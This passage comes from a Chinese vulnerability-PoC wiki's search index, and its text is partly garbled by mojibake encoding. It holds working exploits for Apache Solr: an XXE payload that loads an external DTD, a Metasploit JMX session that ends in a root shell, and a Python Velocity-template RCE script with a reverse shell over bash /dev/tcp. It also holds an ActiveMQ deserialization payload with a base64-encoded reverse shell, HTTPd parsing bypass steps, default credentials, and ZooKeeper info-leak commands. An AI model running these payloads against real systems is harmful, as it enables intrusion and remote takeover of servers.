\"\"\"/solr/{}/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser\"\"\".format(core_name) vuln_url = target_url + file_payload headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"/usr/sbin\" in response.text: print(\"\\033[32m[o] æ¼æ´æˆåŠŸåˆ©ç”¨,å“åº”ä¸º\\n \\033[0m\",response.text) else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35mè¯·è¾“å…¥ä½ çš„dnslogåœ°å€ï¼š\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) elif cmd == \"xxe_file\": POC_3(target_url, core_name) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409.html","title":"Apache Solr JMXæœåŠ¡ RCE  CVE-2019-12409","keywords":"","body":"Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409 æ¼æ´æè¿° Java ManagementExtensionsï¼ˆJMXï¼‰æ˜¯ä¸€ç§JavaæŠ€æœ¯ï¼Œä¸ºç®¡ç†å’Œç›‘è§†åº”ç”¨ç¨‹åºã€ç³»ç»Ÿå¯¹è±¡ã€è®¾å¤‡ï¼ˆå¦‚æ‰“å°æœºï¼‰å’Œé¢å‘æœåŠ¡çš„ç½‘ç»œæä¾›ç›¸åº”çš„å·¥å…·ã€‚JMX ä½œä¸º Javaçš„ä¸€ç§Beanç®¡ç†æœºåˆ¶ï¼Œå¦‚æœJMXæœåŠ¡ç«¯å£æš´éœ²ï¼Œé‚£ä¹ˆè¿œç¨‹æ”»å‡»è€…å¯ä»¥è®©è¯¥æœåŠ¡å™¨è¿œç¨‹åŠ è½½æ¶æ„çš„Beanæ–‡ä»¶ï¼Œéšç€Beançš„æ»¥ç”¨å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr 8.1.1 Apache Solr 8.2.0 ç¯å¢ƒæ­å»º ä¸‹è½½ Apache Solr 8.2.0 ä¹Ÿå¯ä»¥dockeræ­å»º docker pull solr:8.2.0 docker run --name solr -d -p 8983:8983 -t solr:8.2.0 è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° æŸ¥çœ‹æ­å»ºçš„Solræ˜¯å¦å­˜åœ¨æ¼æ´,æŸ¥çœ‹solr.in.shé…ç½®æ–‡ä»¶ä¸­çš„ENABLE_REMOTE_JMX_OPTSé€‰é¡¹è®¾ç½®æ˜¯å¦ä¸ºâ€œTureâ€ï¼Œå¦‚æœä¸ºTureï¼Œåˆ™å­˜åœ¨æ¼æ´ æŸ¥çœ‹æ¼æ´ç«¯å£18983æ˜¯å¦å¼€æ”¾ [!NOTE] nmap xxx.xxx.xxx.xxx -p 18983 root@kali:~/æ¡Œé¢# msfconsole , , / \\ ((__---,,,---__)) (_) O O (_)_________ \\ _ / |\\ o_o \\ M S F | \\ \\ _____ | * ||| WW||| ||| ||| =[ metasploit v5.0.101-dev ] + -- --=[ 2049 exploits - 1108 auxiliary - 344 post ] + -- --=[ 562 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ] Metasploit tip: Writing a custom module? After editing your module, why not try the reload command msf5 > use exploit/multi/misc/java_jmx_server [*] No payload configured, defaulting to java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > set rhost 192.168.51.146 rhost => 192.168.51.146 msf5 exploit(multi/misc/java_jmx_server) > set rport 18983 rport => 18983 msf5 exploit(multi/misc/java_jmx_server) > set payload java/meterpreter/reverse_tcp payload => java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > options Module options (exploit/multi/misc/java_jmx_server): Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX_PASSWORD no The password to interact with an authenticated JMX endpoint JMX_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS 192.168.51.146 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 18983 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.51.149 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Generic (Java Payload) msf5 exploit(multi/misc/java_jmx_server) > run [*] Started reverse TCP handler on 192.168.51.149:4444 [*] 192.168.51.146:18983 - Using URL: http://0.0.0.0:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Local IP: http://192.168.51.149:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Sending RMI Header... [*] 192.168.51.146:18983 - Discovering the JMXRMI endpoint... [+] 192.168.51.146:18983 - JMXRMI endpoint on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Proceeding with handshake... [+] 192.168.51.146:18983 - Handshake with JMX MBean server on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Loading payload... [*] 192.168.51.146:18983 - Replied to request for mlet [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] 192.168.51.146:18983 - Executing payload... [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] Sending stage (53944 bytes) to 192.168.51.146 [*] Meterpreter session 1 opened (192.168.51.149:4444 -> 192.168.51.146:56234) at 2020-11-05 14:17:04 +0800 meterpreter > meterpreter > shell Process 1 created. Channel 1 created. id ç”¨æˆ·id=0(root) ç»„id=0(root) ç»„=0(root) æ¼æ´ä¿®å¤ å°†solr.in.shé…ç½®æ–‡ä»¶ä¸­çš„ENABLE_REMOTE_JMX_OPTSé€‰é¡¹è®¾ç½®ä¸ºfalseï¼Œç„¶åé‡å¯SolræœåŠ¡ã€‚ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957.html","title":"Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957","keywords":"","body":"Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957 æ¼æ´æè¿° åœ¨ç‰¹å®šçš„Solrç‰ˆæœ¬ä¸­ConfigSet APIå­˜åœ¨æœªæˆæƒä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…åˆ©ç”¨æ¼æ´å¯å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr 6.6.0 -6.6.5 Apache Solr 7.0.0 -7.7.3 Apache Solr 8.0.0 -8.6.2 ç¯å¢ƒæ­å»º é€‰æ‹©ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬ ä¸‹è½½å„ç‰ˆæœ¬Solråœ°å€ è¿™é‡Œå¤ç°ä½¿ç”¨çš„æ˜¯ Apache Solr 7.7.0 è¿›è¡Œå¤ç° ä¸‹è½½åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œç¯å¢ƒéƒ¨ç½² cd solr-7.7.0 ./bin/solr start -e cloud -force ç„¶åä¸€è·¯å›è½¦ï¼Œç›´è‡³å‡ºç° Created collection 'gettingstarted' with 2 shard(s), 2 replica(s) with config-set 'gettingstarted' Enabling auto soft-commits with maxTime 3 secs using the Config API POSTing request to Config API: http://localhost:8983/solr/gettingstarted/config {\"set-property\":{\"updateHandler.autoSoftCommit.maxTime\":\"3000\"}} Successfully set-property updateHandler.autoSoftCommit.maxTime to 3000 SolrCloud example running, please visit: http://localhost:8983/solr è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° åœ¨æ”»å‡»æœºä¸Šä¸‹è½½ç›®æ ‡ç‰ˆæœ¬çš„Solr,æ‰§è¡Œä¸‹åˆ—å‘½ä»¤æ‰“åŒ…å‹ç¼©æ–‡ä»¶ solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf zip -r - * > vuln.zip å°† vuln.zip è¿›è¡Œä¸Šä¼  curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @vuln.zip \"http://xxx.xxx.xxx.xxx:8983/solr/admin/configs?action=UPLOAD&name=vuln\" [!NOTE] nameå‚æ•°ä¸ºå‹ç¼©åŒ…çš„æ–‡ä»¶å åˆ©ç”¨æ¼æ´åˆ›å»ºä¸€ä¸ª core curl \"http://xxx.xxx.xxx.xxx:8983/solr/admin/collections?action=CREATE&name=peiqi&numShards=1&replicationFactor=1&wt=xml&collection.configName=vuln\" [!NOTE] nameå‚æ•°ä¸ºåˆ›å»ºçš„coreæ ¸å¿ƒå collection.configNameå‚æ•°ä¸ºä¸Šä¼ çš„æ–‡ä»¶å æŸ¥çœ‹coreåˆ—è¡¨ï¼Œå‘ç°å·²ç»æˆåŠŸåˆ›å»º å†ä½¿ç”¨ Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤ POCä½¿ç”¨è¯¦æƒ…å‚è€ƒå¦ä¸€ç¯‡å¤ç°æ–‡ç«  æ¼æ´åˆ©ç”¨POC [!NOTE] ä½¿ç”¨å‰æŒ‰å¤ç°æ­¥éª¤ä¸Šä¼ å¯¹åº”ç‰ˆæœ¬çš„zipæ–‡ä»¶ï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶ä¸º qwert.zip,å…¶ä»–ä½¿ç”¨æ–¹æ³•ä¸ Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 çš„POCä½¿ç”¨æ–¹æ³•ç±»ä¼¼ #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys import os import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr 6.6.0 -6.6.5 \\033[0m') print('+ \\033[34m Apache Solr 7.0.0 -7.7.3 \\033[0m') print('+ \\033[34m Apache Solr 8.0.0 -8.6.2 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 cve-2020-13957.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mZip >>> vuln.zip(Zipæ–‡ä»¶å) \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): core_name = str(input(\"\\033[35mPlease input Create Core Name\\nCore >>> \\033[0m\")) core_update = \"\"\"%s/solr/admin/collections?action=CREATE&name=%s&numShards=1&replicationFactor=1&wt=xml&collection.configName=%s\"\"\" % (target_url, core_name, file_name.replace(\".zip\",\"\")) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } response = requests.get(url=core_update, headers=headers, timeout=30) if response.status_code != 200: print(\"\\033[31m[x] åˆ›å»ºCoreå¤±è´¥ \\033[0m\") sys.exit(0) else: core = re.findall(r'(.*?)',response.text)[0] vuln_url = target_url + \"/solr/\" + core + \"/config\" print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core + \"/config\\033[0m\") return vuln_url,core def POC_2(target_url, core): open_params = target_url + \"/solr/\" + core + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POSTè¯·æ±‚æˆåŠŸå°†params.resource.loader.enabledè®¾ç½®ä¸ºTrue \\033[0m\") else: print(\"\\033[31m[x] POSTè¯·æ±‚params.resource.loader.enabledè®¾ç½®ä¸ºTrueå¤±è´¥ \\033[0m\") sys.exit(0) def POC_3(target_url, core, cmd): vuln_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] ä»£ç æ‰§è¡Œå¤±è´¥ï¼Œå“åº”ä¸º Error 500 \\033[0m\") else: print(\"\\033[32m[o] æ¼æ´æˆåŠŸåˆ©ç”¨,å“åº”ä¸º\\n \\033[0m\",response.text) def POC_4(target_url, core, IP, PORT): # POC : /bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, PORT) vnul_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = str(input(\"\\033[35mPlease input File Name\\nZip >>> \\033[0m\")) vuln_url,core = POC_1(target_url, file_name) POC_2(target_url, core) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) POC_4(target_url, core, IP, PORT) else: POC_3(target_url, core, cmd) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache HTTPd/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache HTTPd/","title":"Apache HTTPd","keywords":"","body":"Apache HTTPd Apache HTTPd æ¢è¡Œè§£ææ¼æ´ CVE-2017-15715 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache HTTPd/Apache HTTPd æ¢è¡Œè§£ææ¼æ´ CVE-2017-15715.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache HTTPd/Apache HTTPd æ¢è¡Œè§£ææ¼æ´ CVE-2017-15715.html","title":"Apache HTTPd æ¢è¡Œè§£ææ¼æ´ CVE-2017-15715","keywords":"","body":"Apache HTTPd æ¢è¡Œè§£ææ¼æ´ CVE-2017-15715 æ¼æ´æè¿° Apache HTTPDæ˜¯ä¸€æ¬¾HTTPæœåŠ¡å™¨ï¼Œå®ƒå¯ä»¥é€šè¿‡mod_phpæ¥è¿è¡ŒPHPç½‘é¡µã€‚å…¶2.4.0~2.4.29ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æPHPæ—¶ï¼Œ1.php\\x0Aå°†è¢«æŒ‰ç…§PHPåç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ã€‚ æ¼æ´å½±å“ [!NOTE] Apache HTTPd 2.4.0~2.4.29ç‰ˆæœ¬ ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/httpd/CVE-2017-15715 docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:8080 æ­£å¸¸å³å¯ æ¼æ´å¤ç° ç›´æ¥ä¸Šä¼ æ¶æ„æ–‡ä»¶ä¼šè¢«æ‹¦æˆª æŠ“åŒ…ä¿®æ”¹å¦‚ä¸‹å‚æ•° å“åº”ä¸º200ï¼ŒæˆåŠŸç»•è¿‡ è®¿é—® http://xxx.xxx.xxx.xxx:8080/evil.php%0a æˆåŠŸè§¦å‘è§£ææ¼æ´ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ActiveMQ/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ActiveMQ/","title":"Apache ActiveMQ","keywords":"","body":"Apache ActiveMQ Apache ActiveMQ Consoleæ§åˆ¶å° å­˜åœ¨é»˜è®¤å¼±å£ä»¤ Apache ActiveMQ ååºåˆ—åŒ–æ¼æ´ CVE-2015-5254 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ActiveMQ/Apache ActiveMQ Consoleæ§åˆ¶å°é»˜è®¤å¼±å£ä»¤.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ActiveMQ/Apache ActiveMQ Consoleæ§åˆ¶å°é»˜è®¤å¼±å£ä»¤.html","title":"Apache ActiveMQ Consoleæ§åˆ¶å°é»˜è®¤å¼±å£ä»¤","keywords":"","body":"Apache ActiveMQ Console å­˜åœ¨é»˜è®¤å¼±å£ä»¤ æ¼æ´æè¿° Apache ActiveMQ Console å­˜åœ¨é»˜è®¤å¼±å£ä»¤ admin:adminï¼Œè¿›å…¥æ§åˆ¶å°åå¯è¢«è¿›ä¸€æ­¥æ¶æ„åˆ©ç”¨ æ¼æ´å½±å“ [!NOTE] Apache ActiveMQ æ¼æ´å¤ç° Apache ActiveMQ é»˜è®¤å¼€å¯äº† 8186 æ§åˆ¶å° è®¿é—®ç›®æ ‡: http://xxx.xxx.xxx.xxx:8161/admin ä½¿ç”¨é»˜è®¤å£ä»¤ admin:admin Goby & POC [!NOTE] Apache ActiveMQ_Console Weak Password WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ActiveMQ/Apache ActiveMQ ååºåˆ—åŒ–æ¼æ´ CVE-2015-5254.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ActiveMQ/Apache ActiveMQ ååºåˆ—åŒ–æ¼æ´ CVE-2015-5254.html","title":"Apache ActiveMQ ååºåˆ—åŒ–æ¼æ´ CVE-2015-5254","keywords":"","body":"Apache ActiveMQ ååºåˆ—åŒ–æ¼æ´ CVE-2015-5254 æ¼æ´æè¿° Apache ActiveMQæ˜¯ç¾å›½é˜¿å¸•å¥‡ï¼ˆApacheï¼‰è½¯ä»¶åŸºé‡‘ä¼šæ‰€ç ”å‘çš„ä¸€å¥—å¼€æºçš„æ¶ˆæ¯ä¸­é—´ä»¶ï¼Œå®ƒæ”¯æŒJavaæ¶ˆæ¯æœåŠ¡ï¼Œé›†ç¾¤ï¼ŒSpring Frameworkç­‰ã€‚Apache ActiveMQ 5.13.0ä¹‹å‰5.xç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºç¨‹åºæ²¡æœ‰é™åˆ¶å¯åœ¨ä»£ç†ä¸­åºåˆ—åŒ–çš„ç±»ã€‚è¿œç¨‹æ”»å‡»è€…å¯å€ŸåŠ©ç‰¹åˆ¶çš„åºåˆ—åŒ–çš„Javaæ¶ˆæ¯æœåŠ¡ï¼ˆJMSï¼‰ObjectMessageå¯¹è±¡åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç ã€‚ æ¼æ´å½±å“ [!NOTE] Apache ActiveMQ 5.13.0ä¹‹å‰5.xç‰ˆæœ¬ æ¼æ´å¤ç° é¦–å…ˆä¸‹è½½ jmet ä¸‹è½½é“¾æ¥ wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar mkdir external å¯¹ç›®æ ‡å‘é€ä¸€ä¸ªç”Ÿæˆ/tmp/vulnçš„ payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"touch /tmp/vuln\" -Yp ROME xxx.xxx.xxx.xxx 61616 è®¿é—® http://xxx.xxx.xxx.xxx:8161/admin/browse.jsp?JMSDestination=event å¯ä»¥çœ‹åˆ°å¤šäº†ä¸€æ¡æ¶ˆæ¯é˜Ÿåˆ— ç‚¹å‡»è¿™ä¸ªä¿¡æ¯è§¦å‘æ–‡ä»¶åˆ›å»º æˆåŠŸæ‰§è¡Œå‘½ä»¤åˆ›å»ºæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªåå¼¹shellçš„payload bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 (base64ç¼–ç ) YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i} å‘é€payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}\" -Yp ROME 172.21.231.183 61616 åŒæ ·ç‚¹å‡»æ¶ˆæ¯é˜Ÿåˆ—ä¼šè§¦å‘å‘½ä»¤æ‰§è¡Œ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ZooKeeper/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ZooKeeper/","title":"Apache ZooKeeper","keywords":"","body":"WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ZooKeeper/Apache ZooKeeper æœªæˆæƒè®¿é—®æ¼æ´ CVE-2014-085.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache ZooKeeper/Apache ZooKeeper æœªæˆæƒè®¿é—®æ¼æ´ CVE-2014-085.html","title":"Apache ZooKeeper æœªæˆæƒè®¿é—®æ¼æ´ CVE-2014-085","keywords":"","body":"Apache ZooKeeper æœªæˆæƒè®¿é—®æ¼æ´ CVE-2014-085 æ¼æ´æè¿° é»˜è®¤å®‰è£…é…ç½®å®Œçš„zookeeperå…è®¸æœªæˆæƒè®¿é—®ï¼Œç®¡ç†å‘˜æœªé…ç½®è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ã€‚å¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨é»˜è®¤å¼€æ”¾çš„2181ç«¯å£ä¸‹é€šè¿‡æ‰§è¡Œenviå‘½ä»¤è·å¾—å¤§é‡æ•æ„Ÿä¿¡æ¯ï¼ˆç³»ç»Ÿåç§°ã€javaç¯å¢ƒï¼‰å¯¼è‡´ä»»æ„ç”¨æˆ·å¯ä»¥åœ¨ç½‘ç»œä¸å—é™çš„æƒ…å†µä¸‹è¿›è¡Œæœªæˆæƒè®¿é—®è¯»å–æ•°æ® æ¼æ´å½±å“ [!NOTE] Apache ZooKeeper æ¼æ´å¤ç° Apache ZooKeeper é»˜è®¤å¼€æ”¾ 2181ç«¯å£ ,ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è·å–æ•æ„Ÿæ•°æ® echo envi | nc xxx.xxx.xxx.xxx 2181 å…¶ä»–ä¿¡æ¯ 1ã€statï¼šåˆ—å‡ºå…³äºæ€§èƒ½å’Œè¿æ¥çš„å®¢æˆ·ç«¯çš„ç»Ÿè®¡ä¿¡æ¯ã€‚ echo stat |ncat 127.0.0.1 2181 2ã€ruokï¼šæµ‹è¯•æœåŠ¡å™¨æ˜¯å¦è¿è¡Œåœ¨éé”™è¯¯çŠ¶æ€ã€‚ echo ruok |ncat 127.0.0.1 2181 3ã€reqsï¼šåˆ—å‡ºæœªå®Œæˆçš„è¯·æ±‚ã€‚ echo reqs |ncat 127.0.0.1 2181 ã€€ã€€ 4ã€enviï¼šæ‰“å°æœ‰å…³æœåŠ¡ç¯å¢ƒçš„è¯¦ç»†ä¿¡æ¯ã€‚ echo envi |ncat 127.0.0.1 2181 ã€€ã€€ 5ã€dumpï¼šåˆ—å‡ºæœªå®Œæˆçš„ä¼šè¯å’Œä¸´æ—¶èŠ‚ç‚¹ã€‚ echo dump |ncat 127.0.0.1 2181 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/","title":"æœåŠ¡å™¨åº”ç”¨æ¼æ´","keywords":"","body":"æœåŠ¡å™¨åº”ç”¨æ¼æ´ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Redis/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Redis/","title":"Redis","keywords":"","body":"Redis Redis WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Redis/Redis å°äº5.0.5 ä¸»ä»å¤åˆ¶ RCE 